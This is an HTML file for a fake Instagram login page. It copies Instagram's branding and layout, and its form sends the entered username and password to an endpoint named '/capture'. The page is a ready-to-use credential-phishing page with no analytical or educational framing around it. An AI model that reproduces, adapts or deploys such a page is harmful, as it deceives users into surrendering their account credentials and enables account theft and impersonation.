<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px 40px; width: 350px; text-align: center; }
        .logo { font-size: 40px; font-weight: 600; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 3px; font-weight: 600; margin-top: 10px; cursor: pointer; }
        .fa-instagram { font-size: 50px; color: #e1306c; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <i class="fa-brands fa-instagram" ></i>
        <div class="logo">Instagram</div>
        <form action="/capture" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
